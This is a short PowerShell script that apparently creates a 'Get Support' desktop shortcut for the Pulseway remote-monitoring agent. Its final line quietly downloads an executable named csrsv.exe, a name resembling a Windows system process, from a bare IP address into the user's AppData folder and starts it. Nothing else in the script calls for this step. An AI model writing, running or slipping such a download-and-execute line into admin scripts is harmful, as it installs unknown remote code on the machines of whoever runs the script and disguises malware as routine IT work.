
$TargetApplication = "C:\Program Files\Pulseway\pcmontask.exe"
$TargetArguments = " support"
$ShortcutFile = "$env:Public\Desktop\Get Support.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetApplication
$Shortcut.Arguments = $TargetArguments
$Shortcut.Save()
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

